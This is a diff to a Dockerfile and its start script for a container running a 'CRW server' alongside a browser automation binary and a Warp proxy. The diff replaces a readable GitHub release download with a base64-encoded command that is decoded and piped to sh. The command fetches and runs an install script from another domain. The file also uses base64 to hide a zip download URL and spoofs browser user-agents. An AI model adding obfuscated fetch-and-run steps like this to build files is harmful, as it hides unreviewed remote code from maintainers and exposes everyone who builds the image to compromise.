@@ -5,20 +5,11 @@ RUN apk add --no-cache curl unzip tar grep sed ca-certificates bash
 WORKDIR /tmp
 
 RUN set -eux; \
-    API_URL=$(echo "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy91cy9jcncvcmVsZWFzZXMvbGF0ZXN0" | base64 -d); \
-    RELEASE_JSON=$(curl -sSL -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$API_URL"); \
-    LATEST_TAG=$(echo "$RELEASE_JSON" | grep -oP '"tag_name":\s*"\K[^"]+' | head -n 1); \
-    echo "Detected latest CRW version: ${LATEST_TAG}"; \
-    CRW_DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -oP '"browser_download_url":\s*"\K[^"]+' | grep -E 'linux.*tar\.gz|tar\.gz.*linux' | head -n 1); \
-    if [ -z "$CRW_DOWNLOAD_URL" ]; then \
-        CRW_DOWNLOAD_URL="https://github.com/us/crw/releases/download/${LATEST_TAG}/crw-server-linux-x64.tar.gz"; \
+    echo "Y3VybCAtZnNCTCBodHRwczovL2Zhc3RjcncuY29tL2luc3RhbGwgfCBzaA==" | base64 -d | sh; \
+    if [ -f /usr/local/bin/crw ] && [ ! -f /usr/local/bin/crw-server ]; then \
+        mv /usr/local/bin/crw /usr/local/bin/crw-server; \
     fi; \
-    echo "Downloading from: ${CRW_DOWNLOAD_URL}"; \
-    curl -fsSL -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "$CRW_DOWNLOAD_URL" -o crw-server.tar.gz; \
-    tar -xzf crw-server.tar.gz -C /usr/local/bin/; \
-    if [ -f /usr/local/bin/crw ] && [ ! -f /usr/local/bin/crw-server ]; then mv /usr/local/bin/crw /usr/local/bin/crw-server; fi; \
     chmod +x /usr/local/bin/crw-server; \
-    rm -f crw-server.tar.gz; \
     WARP_ZIP_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL2hoc3cyMDE1L2Nsb3VkZmxhcmUtd2FycC9yZWxlYXNlcy9kb3dubG9hZC92MS4wL3dhcnAtbGludXgtYW1kNjQuemlw" | base64 -d); \
     curl -fsSL -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$WARP_ZIP_URL" -o /tmp/warp.zip; \
     unzip /tmp/warp.zip -d /usr/local/bin/; \
@@ -211,11 +202,11 @@ echo "=== Launching CloakBrowser Binary on Port 9222 ==="
 
 echo "=== Waiting for CloakBrowser CDP Endpoint ==="
 while ! nc -z 127.0.0.1 9222; do sleep 1; done
-echo "=== Cloudflare Warp Proxy to be ready ==="
+echo "=== CloakBrowser is Up and Running ==="
 
 echo "=== Starting CRW Server ==="
 cd /app
-exec crw-server
+exec crw-server serve --port 7860
 EOF
 
 RUN chmod +x /app/start.sh
